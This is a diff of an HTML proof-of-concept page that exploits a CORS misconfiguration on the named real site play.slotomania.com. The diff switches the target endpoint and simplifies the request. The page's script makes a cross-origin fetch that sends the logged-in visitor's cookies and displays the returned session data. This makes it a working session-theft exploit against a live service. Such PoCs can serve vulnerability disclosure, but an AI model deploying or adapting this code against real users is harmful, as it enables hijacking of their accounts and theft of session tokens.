@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -95,15 +96,19 @@
         }
     </style>
 </head>
+
 <body>
     <div class="container">
-        <h1>🚨 NEW CORS Misconfiguration PoC</h1>
-        <p>This page demonstrates a cross-origin data exfiltration vulnerability on <strong>play.slotomania.com</strong>. If you are logged into Slotomania in this browser, clicking the button will attempt to retrieve your session data.</p>
-        
-        <div class="status" id="statusBox">Target: getSessionToken.do</div>
-        
+        <h1>🚨🚨 CORS Misconfiguration PoC</h1>
+        <p>This page demonstrates a cross-origin data exfiltration vulnerability on
+            <strong>play.slotomania.com</strong>. If you are logged into Slotomania in this browser, clicking the button
+            will attempt to retrieve your session data.
+        </p>
+
+        <div class="status" id="statusBox">Target: scf-service/client</div>
+
         <button id="exploitBtn">Trigger CORS Exfiltration</button>
-        
+
         <div class="loader" id="loader">Executing Cross-Origin Fetch...</div>
         <pre id="result"></pre>
     </div>
@@ -125,31 +130,28 @@
             fetch(targetUrl, {
                 method: "GET",
                 mode: "cors",
-                credentials: "include", // IMPORTANT: This sends the user's cookies!
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({})
+                credentials: "include" // IMPORTANT: This sends the user's cookies!
             })
-            .then(response => {
-                statusBox.textContent = `Status: ${response.status} ${response.statusText}`;
-                return response.json();
-            })
-            .then(data => {
-                loader.style.display = 'none';
-                resultPre.style.display = 'block';
-                resultPre.textContent = JSON.stringify(data, null, 4);
-                exploitBtn.disabled = false;
-            })
-            .catch(error => {
-                loader.style.display = 'none';
-                resultPre.textContent = "Error: " + error.message + "\n\nNote: If you are seeing a CORS error here, it means the server blocked the specific origin of this PoC or the preflight failed.";
-                resultPre.style.display = 'block';
-                resultPre.style.color = '#f87171';
-                resultPre.style.borderColor = '#991b1b';
-                exploitBtn.disabled = false;
-            });
+                .then(response => {
+                    statusBox.textContent = `Status: ${response.status} ${response.statusText}`;
+                    return response.json();
+                })
+                .then(data => {
+                    loader.style.display = 'none';
+                    resultPre.style.display = 'block';
+                    resultPre.textContent = JSON.stringify(data, null, 4);
+                    exploitBtn.disabled = false;
+                })
+                .catch(error => {
+                    loader.style.display = 'none';
+                    resultPre.textContent = "Error: " + error.message + "\n\nNote: If you are seeing a CORS error here, it means the server blocked the specific origin of this PoC or the preflight failed.";
+                    resultPre.style.display = 'block';
+                    resultPre.style.color = '#f87171';
+                    resultPre.style.borderColor = '#991b1b';
+                    exploitBtn.disabled = false;
+                });
         });
     </script>
 </body>
+
 </html>
